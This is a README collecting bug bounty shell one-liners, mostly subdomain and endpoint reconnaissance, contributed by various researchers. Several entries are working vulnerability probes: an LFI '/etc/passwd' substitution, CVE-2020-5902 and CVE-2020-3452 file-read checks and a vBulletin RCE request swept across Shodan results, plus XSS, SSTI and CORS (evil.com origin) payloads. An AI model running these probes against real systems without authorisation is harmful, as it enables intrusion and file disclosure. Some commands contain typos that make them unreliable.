# One-liner Bug Bounty
> A collection of awesome one-liner scripts especially for bug bounty.

*This repository stores various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily welcome.*

## Extract URLs from Website

```sh
wget -qO- https::/example.com | grep -Eo "(http|https)://[a-zA-Z0-9./?=_=-]*" | sort -u
```

### Local File Inclusion
> @dwisiswant0

```sh
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0

```sh
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

### XSS
> @cihanmehmet

```sh
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```

### CVE-2020-5902
> @Madrobot_

```sh
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```

### CVE-2020-3452
> @vict0ni
```sh
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```

### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
> @Madrobot_

```sh
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```

### Find JS Files
> @D0cK3rG33k

```sh
assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
```

### Extract Endpoints from JS File
> @renniepak

```sh
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

### Get CIDR & Orgz from Target Lists
> @steve_mcilwain

```sh
for DOMAIN in $(cat domains.txt);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```

### Get Subdomains from RapidDNS.io
> @thevillagehacker

```sh
curl -s "https://rapiddns.io/subdomain/abc.com?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
```

### Get Subdomains from BufferOver.run
> @\_ayoubfathi\_

```sh
curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```

### Get Subdomains from Riddler.io
> @pikpikcu
```sh
curl -s "https://riddler.io/search/exportcsv?q=pld:domain.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from VirusTotal
> @pikpikcu
```sh
curl -s "https://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomains from CertSpotter
> @pikpikcu
```sh
curl -s "https://certspotter.com/api/v0/certs?domain=domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomains from Archive
> @pikpikcu
```sh
curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

### Get Subdomains from JLDC
> @pikpikcu
```sh
curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
### Get Subdomains from securitytrails
> @pikpikcu
```sh
curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u
```
### Get Subdomains from crt.sh
> @vict0ni

```sh
curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### Sort & Tested Domains from Recon.dev
> @stokfedrik

```sh
curl "https://recon.dev/api/search?key=apikey&domain=example.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u |httpx -silent
```

### Subdomain Bruteforcer with FFUF
> @GochaOqradze

```sh
ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'
```

### Find All Allocated IP ranges for ASN given an IP address
> wains.be

```sh
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

### Extract IPs from a File
> @emenalf

```sh
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

### Ports Scan without CloudFlare
> @dwisiswant0

```sh
subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

### Create Custom Wordlists
> @tomnomnom

```sh
gau domain.com| unfurl -u keys | tee -a wordlist.txt ; gau domain.com | unfurl -u paths|tee -a ends.txt; sed 's#/#\n#g' ends.txt  | sort -u | tee -a wordlist.txt | sort -u ;rm ends.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' wordlist.txt
```

```sh
cat domains.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a words.txt  
```

### Extracts Juicy Informations
> @Prial Islam Khan

```sh
for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done
```

### Find Subdomains TakeOver
> @hahwul

```sh
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

### Get multiple target's Custom URLs from ParamSpider
> @hahwul

```sh
cat domains | xargs -I % python3 ~/tool/ParamSpider/paramspider.py -l high -o ./spidering/paramspider/% -d % ;
```

### URLs Probing with cURL + Parallel
> @akita_zen

```sh
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### Dump In-scope Assets from `chaos-bugbounty-list`
> @dwisiswant0

```sh
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```

### Dump In-scope Assets from `bounty-targets-data`
> @dwisiswant0

#### HackerOne Programs

```sh
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

#### BugCrowd Programs

```sh
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### Intigriti Programs

```sh
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```

#### YesWeHack Programs

```sh
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### HackenProof Programs

```sh
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```

#### Federacy Programs

```sh
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

###  Get all the urls out of a sitemap.xml
> @healthyoutlet

```sh
curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```

### Pure bash Linkfinder
> @ntrzz

```sh
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > jslinks.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < jslinks.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf jslinks.txt
```

### Extract Endpoints from swagger.json
> @zer0pwn

```sh
curl -s https://domain.tld/v2/swagger.json | jq '.paths | keys[]'
```

### CORS Misconfiguration
> @manas_hunter

```sh
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

### Find Hidden Servers and/or Admin Panels
> @rez0__

```sh
ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 
```

### Recon using api.recon.dev
> @z0idsec

```sh
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=site.com | jg .[].domain
```

### Find live host/domain/assets
> @_YashGoti_

```sh
subfinder -d http://tesla.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

### XSS without gf
> @HacktifyS

```sh
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```

### Extract endpoints from APK files
> @laughface809

```sh
apkurlgrep -a path/to/file.apk
```

### Get Subdomains from IPs
> @laughface809

```sh
python3 hosthunter.py <target-ips.txt> > vhosts.txt
```

### webscreenshot
> @laughface809

```sh
python webscreenshot.py -i list.txt -w 40
```

### Removes duplicate URLs and parameter combinations
> @laughface809

```sh
cat urls.txt |qsreplace -a
```

### Gather domains from content-security-policy:
> @geeknik

```sh
curl -v -silent https://$domain --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```

##  Content Discovery/Recon : 

### Using dns.bufferover.run

```sh
curl -s https://dns.bufferover.run/dns?q=.example.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```

### Using Crt.sh

```sh
curl -s https://dns.bufferover.run/dns?q=.hackerone.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```
  

### Using Certspotter

```sh
curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq
```
  

### Using Certspotter (With port scanning)

```sh
curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq | dig +short -f - | uniq | nmap -T5 -Pn -sS -i - -p 80,443,21,22,8080,8081,8443 --open -n -oG -
```

### Sublist3r One Liner

```sh
. <(cat domains | xargs -n1 -i{} python sublist3r.py -d {} -o {}.txt)
```

### Grab Titles of webpages 

```sh
for i in $(cat Webservers.txt ); do echo "$i | $(curl --connect-timeout 0.5 $i -so - | grep -iPo '(?<=<title>)(.*)(?=</title>)')"; done 
```

### Enumerate hosts from SSL Certificate 

```sh
echo | openssl s_client -connect https://targetdomain.com:443 | openssl x509 -noout -text | grep DNS
```

### Google DNS via HTTPS

```sh
echo "targetdomain.com" | xargs -I domain proxychains curl -s "https://dns.google.com/resolve?name=domain&type=A" | jq .
```

### CommonCrawl to find endpoints on a site

```sh
echo "targetdomain.com" | xargs -I domain curl -s "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.domain&output=json" | jq -r .url | sort -u
```

### Using WebArchive

```sh
curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&output=text&fl=original&collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | uniq
``` 

### Using ThreatCrowd

```sh
curl https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=hackerone.com |jq .subdomains |grep -o '\w.*hackerone.com'
```

### Using Hackertarget

```sh
curl https://api.hackertarget.com/hostsearch/?q=hackerone.com | grep -o '\w.*hackerone.com'
```

### Bruteforce Subdomains

```sh
while read sub; do if host "$sub.example.com" &> /dev/null; then echo "$sub.example.com"; fi; done < wordslist.txt
```

### Assetfinder 

```sh
assetfinder http://hackerone.com > recon.txt; for d in $(<recon.txt); do $(cutycapt --url=$d --out=$d.jpg --max-wait=100000); done
```
### Find Domains that have "xyz" in whois
> @thevillagehacker
```sh
curl -H "User-Agent: Mozilla" "viewdns.info/reversewhois/?..." | grep -Po "<tr><td>[^<]+</td>" | cut -d '>' -f3 | cut -d '<' -f1
```
### Get Content-Type
> @thevillagehacker
```sh
echo abc.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```
### Fuzz with FFUF
> @thevillagehacker
```sh 
assetfinder http://att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```
### Open redirect check
> @thevillagehacker
```sh
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
### Extract URL from .apk file
> @thevillagehacker
```sh
apktool -d com.uber -o uberAPK; grep -Phro "(https?://)[\w\,-/]+[\"\']" uberAPK/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemes.android\|google\|goo.gl"
```
### Information Disclosure
> @thevillagehacker
```sh
cat host.txt | httpx -path //server-status?full=true -status-code -content-length
```
```sh
cat host.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-console/ -status-code -content-length
```
### Find xmlrpc.php in single shot
> @thevillagehacker
```sh
cat domain.txt | assetfinder --subs-only | httprobe | while read url; do xml=$(curl -s -L $url/xmlrpc.php | grep 'XML-RPC');echo -e "$url -> $xml";done | grep 'XML-RPC' | sort -u
```
### Reflected XSS
> @thevillagehacker
```sh
subfinder -d abc.com | httprobe -c 100 > target.txt
cat target.txt | waybackurls | gf xss | kxss
```
```sh
gospider -a -s abc.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
### SSTI to RCE
> @thevillagehacker
```sh
 waybackurls http://target.com | qsreplace "abc{{9*9}}" > fuzz.txt
 ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
 ```
***search: abc81 in burpsuite search and check***
### Check for open redirect,ssrf with waybackurls
> @thevillagehacker

```sh
waybackurls target[.]com | grep ‘http%\|https%'
```
***Note :***
You can replace the URLs you find with yours and hope for an open redirect,ssrf or something else. You can grep out analytic stuff with grep -v. If your target has something with OAuth with a redirect_uri target/* that's an easy Account takeover
### Searching for endpoints, by apks
> @thevillagehacker

```sh
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```
### Fuzz all js files from the target
> @thevillagehacker

```sh
xargs -P 500 -a domain -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

### Subdomain Enumeration
```sh
 curl -s "https://jldc.me/anubis/subdomains/abc.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+"
```

***Note :***
*These oneliners are collected from different sources , Credits to the respesctive authors*
